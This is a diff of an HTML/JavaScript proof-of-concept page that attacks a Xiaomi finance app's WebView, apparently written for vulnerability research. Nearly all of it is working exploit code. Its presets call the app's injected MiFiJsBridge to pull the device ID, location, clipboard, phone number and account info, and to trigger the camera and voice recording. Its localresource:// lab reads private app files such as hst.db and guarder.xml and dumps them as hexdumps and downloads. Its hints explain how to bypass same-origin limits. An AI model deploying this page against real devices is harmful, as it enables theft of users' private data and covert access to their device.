@@ -1,72 +1,173 @@
 <!doctype html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>jr WebFragment / MiFiJsBridge PoC</title>
+  <title>JR WebFragment / MiFiJsBridge PoC</title>
   <style>
     :root{
-      --bg:#0b1220;--panel:#131c2e;--line:#263552;--text:#edf3ff;--muted:#9eb1d3;
-      --ok:#16c784;--warn:#ffb020;--bad:#ff5d73;--btn:#4e9dff;--btn2:#41597e;
+      --bg:#0b1220;
+      --panel:#131c2e;
+      --panel2:#0d1524;
+      --line:#263552;
+      --text:#edf3ff;
+      --muted:#9eb1d3;
+      --ok:#16c784;
+      --warn:#ffb020;
+      --bad:#ff5d73;
+      --btn:#4e9dff;
+      --btn2:#41597e;
+      --btn3:#5c6c86;
     }
     *{box-sizing:border-box}
-    body{margin:0;background:linear-gradient(180deg,#0a1120,#131d31);color:var(--text);font:15px/1.45 "Segoe UI","PingFang SC","Microsoft YaHei",sans-serif}
-    .wrap{max-width:1100px;margin:0 auto;padding:18px}
-    .card{background:rgba(19,28,46,.96);border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:16px;margin-bottom:14px}
-    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:14px}
+    body{
+      margin:0;
+      background:linear-gradient(180deg,#0a1120,#131d31);
+      color:var(--text);
+      font:15px/1.5 Segoe UI,Arial,sans-serif;
+    }
+    .wrap{max-width:1280px;margin:0 auto;padding:18px}
+    .card{
+      background:rgba(19,28,46,.96);
+      border:1px solid rgba(255,255,255,.08);
+      border-radius:16px;
+      padding:16px;
+      margin-bottom:14px;
+      box-shadow:0 10px 30px rgba(0,0,0,.22);
+    }
+    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(360px,1fr));gap:14px}
     h1,h2{margin:0 0 10px}
     p{margin:0 0 10px;color:var(--muted)}
     label{display:block;margin:10px 0 6px;color:#c9d8f6;font-weight:700}
-    input,textarea,select{width:100%;background:#0d1524;color:var(--text);border:1px solid var(--line);border-radius:12px;padding:11px}
-    textarea{min-height:110px;resize:vertical}
+    input,textarea{
+      width:100%;
+      background:var(--panel2);
+      color:var(--text);
+      border:1px solid var(--line);
+      border-radius:12px;
+      padding:11px 12px;
+    }
+    textarea{min-height:120px;resize:vertical}
     .row{display:flex;flex-wrap:wrap;gap:10px;margin-top:12px}
-    button{border:0;border-radius:999px;padding:10px 16px;font-weight:700;color:#fff;background:var(--btn);cursor:pointer}
-    button.secondary{background:var(--btn2)}
+    button,a.btn{
+      border:0;
+      border-radius:999px;
+      padding:10px 16px;
+      font-weight:700;
+      color:#fff;
+      background:var(--btn);
+      cursor:pointer;
+      text-decoration:none;
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+    }
+    button.secondary,a.btn.secondary{background:var(--btn2)}
+    button.ghost{background:var(--btn3)}
     .status{font-size:18px;font-weight:700}
-    .ok{color:var(--ok)} .warn{color:var(--warn)} .bad{color:var(--bad)}
-    .pill{display:inline-block;padding:6px 10px;border-radius:999px;background:rgba(78,157,255,.16);color:#bdd6ff;font-size:13px;margin:0 8px 8px 0}
-    pre{margin:0;white-space:pre-wrap;word-break:break-word;font:13px/1.5 Consolas,monospace}
-    .log{background:#09101c;border-radius:12px;padding:12px;max-height:460px;overflow:auto}
+    .ok{color:var(--ok)}
+    .warn{color:var(--warn)}
+    .bad{color:var(--bad)}
+    .pill{
+      display:inline-block;
+      padding:6px 10px;
+      border-radius:999px;
+      background:rgba(78,157,255,.16);
+      color:#bdd6ff;
+      font-size:13px;
+      margin:0 8px 8px 0;
+    }
     .hint{font-size:13px;color:var(--muted)}
-    .hint code{color:#d7e6ff}
+    .hint code,code{color:#d7e6ff}
+    .mono{font-family:Consolas,monospace}
+    .kv{display:grid;grid-template-columns:170px 1fr;gap:8px;font-size:13px}
+    .kv div:nth-child(odd){color:#b8caed}
+    .log,.resultbox{
+      background:#09101c;
+      border-radius:12px;
+      border:1px solid rgba(255,255,255,.06);
+      padding:12px;
+      overflow:auto;
+    }
+    .log{max-height:420px}
+    pre{
+      margin:0;
+      white-space:pre-wrap;
+      word-break:break-word;
+      font:13px/1.5 Consolas,monospace;
+    }
+    .result-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:12px}
+    .preview{
+      min-height:180px;
+      background:#09101c;
+      border:1px dashed rgba(255,255,255,.15);
+      border-radius:12px;
+      padding:10px;
+      overflow:auto;
+    }
+    .preview iframe,.preview object{
+      width:100%;
+      min-height:320px;
+      border:1px solid rgba(255,255,255,.12);
+      border-radius:10px;
+      background:#fff;
+    }
+    .preview img{
+      max-width:100%;
+      height:auto;
+      display:block;
+      margin:0 auto;
+      border-radius:10px;
+      background:#fff;
+    }
+    .section-title{font-size:13px;color:#bdd6ff;margin-bottom:6px;font-weight:700}
+    .small{font-size:12px;color:var(--muted)}
   </style>
 </head>
 <body>
   <div class="wrap">
     <div class="card">
-      <h1>jr WebFragment / MiFiJsBridge PoC</h1>
-      <p>用途：测试 <code>com.xiaomi.jr.web.WebFragment</code> 是否能加载外部页面、是否注入 <code>MiFiJsBridge</code>，以及可用的 feature/action、<code>localresource://</code> 文件读取面。</p>
-      <div id="status" class="status warn">状态：等待 MiFiJsBridge 注入...</div>
+      <h1>JR WebFragment / MiFiJsBridge PoC</h1>
+      <p>This build fixes the old PoC problems: callback name collision, hidden iframe/img preview area, and text-only logging for binary responses.</p>
+      <div id="status" class="status warn">Status: waiting for MiFiJsBridge...</div>
       <div class="row" style="margin-top:12px">
         <span class="pill" id="urlPill">URL: -</span>
+        <span class="pill" id="originPill">Origin: -</span>
         <span class="pill" id="uaPill">UA: -</span>
       </div>
       <p class="hint" style="margin-top:8px">
-        说明：该桥存在 <code>FeatureConfigManager</code> 域名门控。对第三方域页面，很多 action 可能返回 <code>205</code>；这恰好可以用本页直接测试。  
+        JEB confirms that <code>WebFragment.addMiFiJsInterfaces()</code> injects <code>MiFiJsBridge</code>, and
+        <code>MiFiWebViewClient.interceptRequest()</code> handles <code>localresource://</code> by taking
+        <code>Uri.getPath()</code> and passing it to <code>FileUtils.readFileAsStream(path)</code>.
+        It returns <code>new WebResourceResponse("", "", stream)</code> without explicit CORS headers.
+        So if this PoC is loaded over <code>http(s)</code>, JS often cannot read the body directly.
+        To dump bytes into the DOM reliably, relaunch this same PoC via <code>localresource://x/...</code>
+        so the page itself becomes same-origin with the target resource.
       </p>
     </div>
 
     <div class="grid">
       <div class="card">
-        <h2>1. 通用桥调用</h2>
+        <h2>1. Bridge calls</h2>
         <label for="feature">feature</label>
         <input id="feature" value="Data">
         <label for="action">action</label>
         <input id="action" value="getDeviceId">
-        <label for="callback">callback 名称</label>
-        <input id="callback" value="onBridgeCallback">
-        <label for="param">param 字符串 / JSON</label>
+        <label for="callbackName">callback name</label>
+        <input id="callbackName" value="onBridgeCallback">
+        <label for="param">param string / JSON</label>
         <textarea id="param"></textarea>
         <div class="row">
           <button onclick="doLookup()">lookup</button>
           <button onclick="doInvoke()">invoke</button>
           <button class="secondary" onclick="doInvokeBatch()">invokeBatch</button>
+          <button class="ghost" onclick="checkBridge()">check bridge</button>
         </div>
       </div>
 
       <div class="card">
-        <h2>2. 高风险候选 API</h2>
-        <p class="hint">这些是静态审计中最值得测的 feature/action。点击后会自动填充并执行 <code>lookup</code>，可再点 <code>invoke</code>。</p>
+        <h2>2. Bridge presets</h2>
+        <p class="hint">These are just debug shortcuts. If the page origin is not whitelisted, 205 / deny is expected.</p>
         <div class="row">
           <button onclick="preset('Data','getDeviceId','')">Data.getDeviceId</button>
           <button onclick="preset('Data','getLocation','')">Data.getLocation</button>
@@ -74,166 +175,512 @@
           <button onclick="preset('System','readClipboard','')">System.readClipboard</button>
           <button onclick="preset('Account','getUserInfo','')">Account.getUserInfo</button>
           <button onclick="preset('Account','getPhoneNumber','')">Account.getPhoneNumber</button>
-          <button onclick="preset('Storage','saveFile', '{\"name\":\"poc\",\"data\":\"hello-from-poc\",\"format\":0,\"authorities\":[\"*\"]}')">Storage.saveFile</button>
+          <button onclick="preset('Storage','saveFile','{\"name\":\"poc\",\"data\":\"hello-from-poc\",\"format\":0,\"authorities\":[\"*\"]}')">Storage.saveFile</button>
           <button onclick="preset('Storage','loadFile','poc')">Storage.loadFile</button>
-          <button onclick="preset('Photo','pickPhoto', '{\"photoName\":\"poc\",\"width\":0,\"height\":0,\"returnMode\":0}')">Photo.pickPhoto</button>
-          <button onclick="preset('Photo','capturePhoto', '{\"photoName\":\"poc_cam\",\"title\":\"PoC\",\"description\":\"PoC\",\"width\":0,\"height\":0,\"returnMode\":0,\"isFrontCamera\":false,\"enableSwitchFrontBackCamera\":true,\"showResult\":true}')">Photo.capturePhoto</button>
+          <button onclick="preset('Photo','pickPhoto','{\"photoName\":\"poc\",\"width\":0,\"height\":0,\"returnMode\":0}')">Photo.pickPhoto</button>
+          <button onclick="preset('Photo','capturePhoto','{\"photoName\":\"poc_cam\",\"title\":\"PoC\",\"description\":\"PoC\",\"width\":0,\"height\":0,\"returnMode\":0,\"isFrontCamera\":false,\"enableSwitchFrontBackCamera\":true,\"showResult\":true}')">Photo.capturePhoto</button>
           <button onclick="preset('Voice','startRecord','voice_poc')">Voice.startRecord</button>
           <button onclick="preset('Permission','requestPermission','[\"android.permission.ACCESS_FINE_LOCATION\"]')">Permission.requestPermission</button>
         </div>
       </div>
 
       <div class="card">
-        <h2>3. localresource:// 测试</h2>
-        <p class="hint">`WebFragment.MiFiWebViewClient.interceptRequest()` 会特殊处理 <code>localresource://</code>。本页提供多种探测方式。</p>
-        <label for="localres">localresource URL</label>
-        <input id="localres" value="localresource://x/data/data/com.xiaomi.shop/shared_prefs/guarder.xml">
+        <h2>3. localresource lab</h2>
+        <label for="localres">target path or localresource URL</label>
+        <input id="localres" value="localresource://x/data/data/com.xiaomi.shop/files/lldt/hst.db">
+        <p class="hint">
+          In this implementation, <code>localresource://x/data/...</code> and <code>localresource:///data/...</code>
+          both land on the same <code>Uri.getPath()</code>. For same-origin testing, keeping <code>host=x</code>
+          is the most useful form. <code>host=photo</code> is a special case that pulls image bytes via <code>PhotoManager</code>.
+        </p>
         <div class="row">
-          <button onclick="testLocalresourceFetch()">fetch</button>
-          <button onclick="testLocalresourceImg()">img</button>
-          <button onclick="testLocalresourceIframe()">iframe</button>
-          <button class="secondary" onclick="testLocalresourceNav()">顶层跳转</button>
+          <button onclick="normalizeLocalresource()">normalize to x-host</button>
+          <button class="secondary" onclick="setPresetDb()">preset hst.db</button>
+          <button class="secondary" onclick="setPresetGuarder()">preset guarder.xml</button>
         </div>
-        <div id="sandbox" style="display:none"></div>
+        <div class="row">
+          <button onclick="testLocalresourceXhr()">XHR bytes</button>
+          <button onclick="testLocalresourceFetch()">fetch bytes</button>
+          <button class="secondary" onclick="testLocalresourceIframe()">iframe preview</button>
+          <button class="secondary" onclick="testLocalresourceObject()">object preview</button>
+          <button class="secondary" onclick="testLocalresourceImg()">img preview</button>
+          <button class="ghost" onclick="testLocalresourceNav()">top-level nav</button>
+        </div>
+        <div class="row">
+          <button class="ghost" onclick="clearPreview()">clear preview</button>
+          <button class="ghost" onclick="clearResult()">clear result</button>
+          <a id="downloadLink" class="btn secondary" href="#" download="localresource.bin" style="display:none">download last result</a>
+        </div>
       </div>
 
       <div class="card">
-        <h2>4. 预置回调</h2>
-        <p class="hint">有些异步 action 会通过 callback 回调，这里会统一记录。</p>
-        <div class="row">
-          <button class="secondary" onclick="checkBridge()">重新检测 bridge</button>
-          <button class="secondary" onclick="clearLog()">清空日志</button>
+        <h2>4. Runtime</h2>
+        <div class="kv">
+          <div>page mode</div><div id="modeCell">-</div>
+          <div>target URL</div><div id="resolvedUrlCell" class="mono">-</div>
+          <div>target same-origin</div><div id="sameOriginCell">-</div>
+          <div>bridge state</div><div id="bridgeCell">-</div>
+          <div>advice</div><div id="adviceCell">-</div>
         </div>
       </div>
     </div>
 
     <div class="card">
-      <h2>日志</h2>
-      <div class="log"><pre id="log"></pre></div>
+      <h2>5. Preview area</h2>
+      <p class="hint">The old PoC appended iframe/img into a hidden sandbox, so a successful request still looked invisible. This area is now always visible.</p>
+      <div id="preview" class="preview"></div>
+      <div id="iframeReadback" class="small" style="margin-top:10px"></div>
+    </div>
+
+    <div class="card">
+      <h2>6. Binary result</h2>
+      <div class="result-grid">
+        <div>
+          <div class="section-title">summary</div>
+          <div class="resultbox"><pre id="resultMeta">-</pre></div>
+        </div>
+        <div>
+          <div class="section-title">UTF-8 preview</div>
+          <div class="resultbox"><pre id="resultText">-</pre></div>
+        </div>
+        <div>
+          <div class="section-title">Latin-1 preview</div>
+          <div class="resultbox"><pre id="resultLatin1">-</pre></div>
+        </div>
+        <div>
+          <div class="section-title">Hexdump (first 4096 bytes)</div>
+          <div class="resultbox"><pre id="resultHex">-</pre></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>7. Log</h2>
+      <div class="row">
+        <button class="ghost" onclick="clearLog()">clear log</button>
+      </div>
+      <div class="log" style="margin-top:10px"><pre id="log"></pre></div>
     </div>
   </div>
 
   <script>
+    const state = {
+      lastObjectUrl: null,
+      lastBytes: null
+    };
+
+    function ui(id){ return document.getElementById(id); }
     function ts(){ return new Date().toLocaleString(); }
     function safe(v){
       if(v === undefined) return "undefined";
       if(v === null) return "null";
       if(typeof v === "string") return v;
-      try { return JSON.stringify(v); } catch(e) { return String(v); }
+      try { return JSON.stringify(v, null, 2); } catch(e) { return String(v); }
     }
     function log(msg){
-      const el = document.getElementById("log");
+      const el = ui("log");
       el.textContent += `[${ts()}] ${msg}\n`;
       el.parentElement.scrollTop = el.parentElement.scrollHeight;
-      console.log(msg);
+      try { console.log(msg); } catch(e) {}
     }
     function clearLog(){
-      document.getElementById("log").textContent = "";
+      ui("log").textContent = "";
       log("log cleared");
     }
+
+    function revokeLastObjectUrl(){
+      if(state.lastObjectUrl){
+        try { URL.revokeObjectURL(state.lastObjectUrl); } catch(e) {}
+        state.lastObjectUrl = null;
+      }
+    }
+
+    function clearPreview(){
+      revokeLastObjectUrl();
+      ui("preview").innerHTML = "";
+      ui("iframeReadback").textContent = "";
+      log("preview cleared");
+    }
+
+    function clearResult(){
+      revokeLastObjectUrl();
+      state.lastBytes = null;
+      ui("resultMeta").textContent = "-";
+      ui("resultText").textContent = "-";
+      ui("resultLatin1").textContent = "-";
+      ui("resultHex").textContent = "-";
+      ui("downloadLink").style.display = "none";
+      ui("downloadLink").href = "#";
+      log("result cleared");
+    }
+
     function ready(){
       return !!(window.MiFiJsBridge &&
         typeof MiFiJsBridge.lookup === "function" &&
         typeof MiFiJsBridge.invoke === "function");
     }
+
+    function getFeature(){ return ui("feature").value.trim(); }
+    function getAction(){ return ui("action").value.trim(); }
+    function getCallbackName(){ return ui("callbackName").value.trim(); }
+    function getParam(){ return ui("param").value; }
+
+    function ensureCallback(name){
+      if(!name) return "";
+      if(typeof window[name] !== "function"){
+        window[name] = function(resp){
+          log(`${name} => ${safe(resp)}`);
+        };
+        log(`registered window.${name} callback`);
+      }
+      return name;
+    }
+
     function checkBridge(){
-      document.getElementById("urlPill").textContent = "URL: " + location.href;
-      document.getElementById("uaPill").textContent = "UA: " + navigator.userAgent;
-      const status = document.getElementById("status");
+      ui("urlPill").textContent = "URL: " + location.href;
+      ui("originPill").textContent = "Origin: " + (location.origin || (location.protocol + "//" + location.host));
+      ui("uaPill").textContent = "UA: " + navigator.userAgent;
+      const status = ui("status");
+      const bridgeCell = ui("bridgeCell");
       if(ready()){
         status.className = "status ok";
-        status.textContent = "状态：MiFiJsBridge 已注入";
-        log("MiFiJsBridge detected");
-      } else {
+        status.textContent = "Status: MiFiJsBridge injected";
+        bridgeCell.textContent = "MiFiJsBridge present, lookup/invoke available";
+        try{
+          log("MiFiJsBridge detected: methods=" + Object.keys(window.MiFiJsBridge).join(", "));
+        }catch(e){
+          log("MiFiJsBridge detected");
+        }
+      }else{
         status.className = "status bad";
-        status.textContent = "状态：MiFiJsBridge 不存在";
+        status.textContent = "Status: MiFiJsBridge missing";
+        bridgeCell.textContent = "MiFiJsBridge not found";
         log("MiFiJsBridge missing");
       }
+      updateModeHint();
     }
-    function feature(){ return document.getElementById("feature").value.trim(); }
-    function action(){ return document.getElementById("action").value.trim(); }
-    function callback(){ return document.getElementById("callback").value.trim(); }
-    function param(){ return document.getElementById("param").value; }
 
     function doLookup(){
       if(!ready()){ checkBridge(); return; }
       try{
-        const ret = MiFiJsBridge.lookup(feature(), action());
-        log(`lookup(${feature()}, ${action()}) => ${safe(ret)}`);
+        const ret = MiFiJsBridge.lookup(getFeature(), getAction());
+        log(`lookup(${getFeature()}, ${getAction()}) => ${safe(ret)}`);
         return ret;
       }catch(e){
         log(`lookup threw: ${e}`);
       }
     }
+
     function doInvoke(){
       if(!ready()){ checkBridge(); return; }
       try{
-        const ret = MiFiJsBridge.invoke(feature(), action(), callback(), param());
-        log(`invoke(${feature()}, ${action()}, ${callback()}, ${safe(param())}) => ${safe(ret)}`);
+        const cb = ensureCallback(getCallbackName());
+        const ret = MiFiJsBridge.invoke(getFeature(), getAction(), cb, getParam());
+        log(`invoke(${getFeature()}, ${getAction()}, ${cb}, ${safe(getParam())}) => ${safe(ret)}`);
         return ret;
       }catch(e){
         log(`invoke threw: ${e}`);
       }
     }
+
     function doInvokeBatch(){
       if(!ready()){ checkBridge(); return; }
       try{
         const body = {};
-        body[feature()] = [action()];
+        body[getFeature()] = [getAction()];
         const ret = MiFiJsBridge.invokeBatch(JSON.stringify(body));
         log(`invokeBatch(${JSON.stringify(body)}) => ${safe(ret)}`);
+        return ret;
       }catch(e){
         log(`invokeBatch threw: ${e}`);
       }
     }
-    function preset(f,a,p){
-      document.getElementById("feature").value = f;
-      document.getElementById("action").value = a;
-      document.getElementById("param").value = p || "";
+
+    function preset(f, a, p){
+      ui("feature").value = f;
+      ui("action").value = a;
+      ui("param").value = p || "";
       doLookup();
     }
 
-    function onBridgeCallback(resp){ log(`onBridgeCallback => ${safe(resp)}`); }
-    function onCallback(resp){ log(`onCallback => ${safe(resp)}`); }
-    function callback(resp){ log(`callback => ${safe(resp)}`); }
+    window.onBridgeCallback = function(resp){ log(`onBridgeCallback => ${safe(resp)}`); };
+    window.onCallback = function(resp){ log(`onCallback => ${safe(resp)}`); };
+    window.callback = function(resp){ log(`callback => ${safe(resp)}`); };
 
-    function localres(){ return document.getElementById("localres").value.trim(); }
+    function normalizeLocalresourceValue(raw){
+      let s = (raw || "").trim();
+      if(!s) return "";
+      if(/^localresource:/i.test(s)){
+        s = s.replace(/^localresource:\/*/i, "");
+        if(!s) return "localresource://x/";
+        if(s.startsWith("/")) return "localresource://x" + s;
+        const idx = s.indexOf("/");
+        if(idx === -1) return "localresource://" + s;
+        const host = s.slice(0, idx) || "x";
+        const path = s.slice(idx) || "/";
+        return `localresource://${host}${path}`;
+      }
+      if(!s.startsWith("/")) s = "/" + s;
+      return "localresource://x" + s;
+    }
+
+    function localres(){
+      return normalizeLocalresourceValue(ui("localres").value);
+    }
+
+    function normalizeLocalresource(){
+      const normalized = localres();
+      ui("localres").value = normalized;
+      log(`normalized localresource => ${normalized}`);
+      updateModeHint();
+    }
+
+    function setPresetDb(){
+      ui("localres").value = "localresource://x/data/data/com.xiaomi.shop/files/lldt/hst.db";
+      updateModeHint();
+      log("preset => hst.db");
+    }
+
+    function setPresetGuarder(){
+      ui("localres").value = "localresource://x/data/data/com.xiaomi.shop/shared_prefs/guarder.xml";
+      updateModeHint();
+      log("preset => guarder.xml");
+    }
+
+    function parseOriginish(url){
+      const m = String(url).match(/^([a-zA-Z][a-zA-Z0-9+.-]*):\/\/([^\/?#]*)/);
+      if(!m) return { scheme: "", host: "", origin: "" };
+      return { scheme: m[1].toLowerCase(), host: m[2], origin: `${m[1].toLowerCase()}://${m[2]}` };
+    }
+
+    function basenameFromUrl(url){
+      const clean = String(url).split(/[?#]/)[0];
+      const idx = clean.lastIndexOf("/");
+      return idx >= 0 ? clean.slice(idx + 1) || "localresource.bin" : "localresource.bin";
+    }
+
+    function escapeBinaryString(str, limit){
+      let out = "";
+      const max = Math.min(str.length, limit || 4096);
+      for(let i = 0; i < max; i++){
+        const c = str.charCodeAt(i);
+        if(c === 10) out += "\n";
+        else if(c === 13) out += "\\r";
+        else if(c === 9) out += "\\t";
+        else if(c >= 32 && c <= 126) out += str[i];
+        else out += `\\x${c.toString(16).padStart(2, "0")}`;
+      }
+      if(str.length > max) out += `\n... truncated (${str.length - max} more chars)`;
+      return out || "(empty)";
+    }
+
+    function decodeUtf8(bytes){
+      try{
+        return escapeBinaryString(new TextDecoder("utf-8", { fatal:false }).decode(bytes), 8192);
+      }catch(e){
+        let s = "";
+        const max = Math.min(bytes.length, 8192);
+        for(let i = 0; i < max; i++) s += String.fromCharCode(bytes[i]);
+        return escapeBinaryString(s, 8192);
+      }
+    }
+
+    function decodeLatin1(bytes){
+      let s = "";
+      const max = Math.min(bytes.length, 8192);
+      for(let i = 0; i < max; i++) s += String.fromCharCode(bytes[i]);
+      return escapeBinaryString(s, 8192);
+    }
+
+    function hexdump(bytes, limit){
+      const max = Math.min(bytes.length, limit || 4096);
+      const lines = [];
+      for(let i = 0; i < max; i += 16){
+        const chunk = bytes.slice(i, Math.min(i + 16, max));
+        const hex = Array.from(chunk).map(b => b.toString(16).padStart(2, "0")).join(" ");
+        const ascii = Array.from(chunk).map(b => (b >= 32 && b <= 126) ? String.fromCharCode(b) : ".").join("");
+        lines.push(i.toString(16).padStart(8, "0") + "  " + hex.padEnd(47, " ") + "  " + ascii);
+      }
+      if(bytes.length > max) lines.push(`... truncated, total=${bytes.length} bytes`);
+      return lines.join("\n") || "(empty)";
+    }
+
+    function updateDownloadLink(bytes, url){
+      revokeLastObjectUrl();
+      const blob = new Blob([bytes]);
+      state.lastObjectUrl = URL.createObjectURL(blob);
+      const a = ui("downloadLink");
+      a.href = state.lastObjectUrl;
+      a.download = basenameFromUrl(url);
+      a.style.display = "inline-flex";
+    }
+
+    function renderBytes(source, url, bytes, meta){
+      state.lastBytes = bytes;
+      updateDownloadLink(bytes, url);
+      const summary = {
+        source,
+        url,
+        byteLength: bytes.length,
+        first32Ascii: Array.from(bytes.slice(0, 32)).map(b => (b >= 32 && b <= 126) ? String.fromCharCode(b) : ".").join(""),
+        ...meta
+      };
+      ui("resultMeta").textContent = safe(summary);
+      ui("resultText").textContent = decodeUtf8(bytes);
+      ui("resultLatin1").textContent = decodeLatin1(bytes);
+      ui("resultHex").textContent = hexdump(bytes, 4096);
+      log(`${source} got ${bytes.length} bytes from ${url}`);
+    }
+
+    function updateModeHint(){
+      const pageOrigin = parseOriginish(location.protocol + "//" + location.host);
+      const target = localres();
+      const targetOrigin = parseOriginish(target);
+      const sameOrigin = pageOrigin.scheme === targetOrigin.scheme && pageOrigin.host === targetOrigin.host;
+      const localMode = location.protocol === "localresource:";
+      ui("modeCell").textContent = localMode
+        ? `localresource mode (${location.protocol}//${location.host})`
+        : `remote page mode (${location.protocol}//${location.host})`;
+      ui("resolvedUrlCell").textContent = target || "-";
+      ui("sameOriginCell").textContent = sameOrigin
+        ? "same-origin: XHR/fetch should be attempted first"
+        : "cross-origin: XHR/fetch may be blocked by CORS/opaque response";
+      if(localMode && sameOrigin){
+        ui("adviceCell").textContent = "Best mode for dumping localresource bytes directly into the DOM.";
+      }else if(!localMode){
+        ui("adviceCell").textContent = "Current page is http/https. To dump bytes reliably, relaunch this PoC itself via localresource://x/... so the page becomes same-origin with the target.";
+      }else{
+        ui("adviceCell").textContent = "Make the page origin and target origin both be localresource://x.";
+      }
+    }
+
     async function testLocalresourceFetch(){
       const url = localres();
+      updateModeHint();
       try{
+        log(`fetch start => ${url}`);
         const r = await fetch(url);
-        const t = await r.text();
-        log(`fetch(${url}) status=${r.status} len=${t.length} body=${t.slice(0,300)}`);
+        const ab = await r.arrayBuffer();
+        const headers = {};
+        try{
+          for(const [k, v] of r.headers.entries()) headers[k] = v;
+        }catch(e){}
+        renderBytes("fetch", url, new Uint8Array(ab), {
+          status: r.status,
+          ok: r.ok,
+          redirected: r.redirected,
+          type: r.type,
+          responseUrl: r.url,
+          headers
+        });
       }catch(e){
         log(`fetch(${url}) threw: ${e}`);
       }
     }
+
+    function testLocalresourceXhr(){
+      const url = localres();
+      updateModeHint();
+      log(`xhr start => ${url}`);
+      try{
+        const xhr = new XMLHttpRequest();
+        xhr.open("GET", url, true);
+        xhr.responseType = "arraybuffer";
+        xhr.timeout = 15000;
+        xhr.onload = function(){
+          try{
+            if(xhr.response){
+              renderBytes("xhr", url, new Uint8Array(xhr.response), {
+                status: xhr.status,
+                statusText: xhr.statusText,
+                responseURL: xhr.responseURL || ""
+              });
+              return;
+            }
+            const text = xhr.responseText || "";
+            const bytes = new Uint8Array(text.length);
+            for(let i = 0; i < text.length; i++) bytes[i] = text.charCodeAt(i) & 0xff;
+            renderBytes("xhr-text-fallback", url, bytes, {
+              status: xhr.status,
+              statusText: xhr.statusText,
+              responseURL: xhr.responseURL || ""
+            });
+          }catch(e){
+            log(`xhr onload parse error: ${e}`);
+          }
+        };
+        xhr.onerror = function(){ log(`xhr(${url}) error`); };
+        xhr.onabort = function(){ log(`xhr(${url}) abort`); };
+        xhr.ontimeout = function(){ log(`xhr(${url}) timeout`); };
+        xhr.send();
+      }catch(e){
+        log(`xhr(${url}) threw: ${e}`);
+      }
+    }
+
     function testLocalresourceImg(){
       const url = localres();
+      clearPreview();
+      updateModeHint();
       const img = new Image();
       img.onload = () => log(`img(${url}) loaded width=${img.width} height=${img.height}`);
-      img.onerror = (e) => log(`img(${url}) error`);
+      img.onerror = () => log(`img(${url}) error`);
       img.src = url;
-      document.getElementById("sandbox").appendChild(img);
+      ui("preview").appendChild(img);
       log(`img request sent => ${url}`);
     }
+
     function testLocalresourceIframe(){
       const url = localres();
+      clearPreview();
+      updateModeHint();
       const iframe = document.createElement("iframe");
-      iframe.onload = () => log(`iframe(${url}) loaded`);
+      iframe.onload = () => {
+        log(`iframe(${url}) loaded`);
+        try{
+          const doc = iframe.contentDocument;
+          const txt = doc && doc.documentElement ? (doc.body ? doc.body.innerText : doc.documentElement.innerText) : "";
+          if(txt){
+            ui("iframeReadback").textContent = "iframe readable preview:\n" + escapeBinaryString(txt, 4096);
+            log(`iframe readback len=${txt.length}`);
+          }else{
+            ui("iframeReadback").textContent = "iframe loaded, but there is no readable text content.";
+          }
+        }catch(e){
+          ui("iframeReadback").textContent = "iframe loaded, but the parent page cannot read its DOM (likely cross-origin).";
+          log(`iframe(${url}) readback blocked: ${e}`);
+        }
+      };
       iframe.onerror = () => log(`iframe(${url}) error`);
       iframe.src = url;
-      document.getElementById("sandbox").appendChild(iframe);
+      ui("preview").appendChild(iframe);
       log(`iframe request sent => ${url}`);
     }
+
+    function testLocalresourceObject(){
+      const url = localres();
+      clearPreview();
+      updateModeHint();
+      const obj = document.createElement("object");
+      obj.data = url;
+      obj.type = "text/plain";
+      obj.onload = () => log(`object(${url}) loaded`);
+      obj.onerror = () => log(`object(${url}) error`);
+      ui("preview").appendChild(obj);
+      log(`object request sent => ${url}`);
+    }
+
     function testLocalresourceNav(){
       const url = localres();
       log(`navigating to ${url}`);
       location.href = url;
     }
 
+    ui("localres").addEventListener("input", updateModeHint);
+
     window.addEventListener("load", function(){
       log("page loaded");
+      normalizeLocalresource();
       checkBridge();
       setTimeout(checkBridge, 1000);
     });
